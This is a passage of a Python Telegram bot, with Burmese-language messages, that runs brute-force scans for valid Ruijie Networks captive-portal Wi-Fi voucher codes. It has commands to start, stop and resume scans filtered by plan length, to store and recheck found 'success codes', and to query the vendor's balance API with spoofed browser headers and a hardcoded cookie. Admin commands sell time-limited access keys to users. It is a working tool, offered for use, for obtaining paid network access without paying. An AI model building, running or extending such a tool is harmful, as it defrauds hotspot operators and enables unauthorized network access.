        await bot.reply_to(message, "✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n/brute ဖြင့် စတင်ပါ။")
    else:
        await bot.reply_to(message, "Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n"
            "/brute <mode> [target] [plan]\n\n"
            "ဥပမာ:\n"
            "/brute 6 10 1d        → ၁ရက် code ၁၀ ခု\n"
            "/brute 6 1d unlimit  → ၁ရက် (သို့) unlimit code\n"
            "/brute 6 10 1d 1mo   → ၁ရက် (သို့) ၁လ code ၁၀ ခု\n"
            "/brute 6             → အစုံရှာ\n\n"
            "Plan ကိုယ်ကြိုက်သလောက်ပေးနိုင် (30min, 2h, 1d, 1mo, unlimit ...)"
        )
        return

    mode = args[1]
    target = None
    plan_filters = []

    idx = 2
    # Check if next arg is a target (integer, not a plan string)
    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try:
            target = int(args[idx])
            idx += 1
        except ValueError:
            await bot.reply_to(message, "Target သည် ဂဏန်းဖြစ်ရပါမည်။\nPlan ဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
            return

    # Remaining args are plan filters (can be multiple)
    for arg in args[idx:]:
        if PLAN_RE.match(arg):
            plan_filters.append(arg)
        else:
            await bot.reply_to(message, f"'{arg}' သည် plan ပုံစံမမှန်ပါ။\nဥပမာ: 30min, 2h, 1d, 1mo, unlimit")
            return

    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "target": target, "plan_filters": plan_filters}
        prev = last_scan_params[chat_id]
        prev_plans = ' / '.join(prev.get('plan_filters') or []) or 'any'
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, target: {prev['target']}, plan: {prev_plans}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, target, message, plan_filters=plan_filters)

async def start_brute_scan(chat_id, mode, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        scan_tasks.pop(chat_id, None)
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params['target'], message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:  # new_scan
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    # Build lines — use cached plan (no live API call needed)
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c = item["code"]
            plan = item.get("plan", "N/A")
            parts.append(f"`{c}` – ⏳ {plan}")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    await send_chunks(message.chat.id, full_text, parse_mode="Markdown",
                      reply_to_message_id=message.message_id)


@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, False)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    save_state()
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
        return
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        code = item["code"]
        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(item)   # keep same session_id for balance
    if new_success:
        success_texts[chat_id] = new_success
        # Optionally show codes after recheck (no balance fetch here to keep it fast)
        await bot.reply_to(message, f"✅ Rechecked Codes:\n" + "\n".join([i["code"] for i in new_success]))
    else:
        success_texts[chat_id] = []
        await bot.reply_to(message, "Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}"
    )

@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    chat_id = message.chat.id

    # Collect test targets: stored success codes for this chat, or all chats
    targets = []
    for cid, items in success_texts.items():
        for item in items:
            targets.append({"chat_id": cid, "code": item["code"], "session_id": item["session_id"]})

    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။ Scan လုပ်ပြီး code တွေ့မှ testbalance သုံးလို့ရပါမည်။")
        return

    await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")

    for t in targets[:3]:  # max 3 codes to avoid spam
        sid = t["session_id"]
        code = t["code"]
        url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}"
        headers = {
            'authority': 'portal-as.ruijienetworks.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,my;q=0.8',
            'content-type': 'application/json;',
            'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={sid}&lang=en_US&redirectUrl=https://www.ruijienetwoacom&authTypeype=15',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
        }
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                raw = await resp.text()
                result = (
                    f"🎯 Code: `{code}`\n"
                    f"🔑 Session ID: `{sid}`\n"
                    f"📡 HTTP Status: `{resp.status}`\n\n"
                    f"📦 Raw Response:\n```\n{raw[:2000]}\n```"
                )
                await bot.send_message(chat_id, result, parse_mode="Markdown")
        except Exception as e:
            await bot.send_message(chat_id, f"❌ Code `{code}` error: {e}", parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message, "Usage:\n/genkey 1h30m 123456789\n/genkey unlimited 123456789")
        return
    plan = args[1]
    user_id = args[2]
    expiry = generate_expiry(plan)
    if not expiry:
        await bot.reply_to(message, "Duration ပုံစံမမှန်ပါ။ ဥပမာ: 30m, 1h, 2d, 1h30m, unlimited")
        return
    auth_list, sha = await get_file_content("auth_list.json")
    auth_list[user_id] = {"expires_at": expiry, "plan": plan}
    await update_file_content("auth_list.json", auth_list, sha, f"Add key for {user_id}")
    await bot.reply_to(message, f"✅ Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n/delkey 123456789")
        return
    user_id = args[1]
    auth_list, sha = await get_file_content("auth_list.json")
    if user_id not in auth_list:
        await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
        return
    del auth_list[user_id]
    await update_file_content("auth_list.json", auth_list, sha, f"Delete key for {user_id}")
    approve.pop(int(user_id), None)
    user_data.pop(int(user_id), None)
    await bot.reply_to(message, f"✅ Key Deleted\n\nUSER ID : {user_id}")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=True)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        load_state()
        await load_saved_results()
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
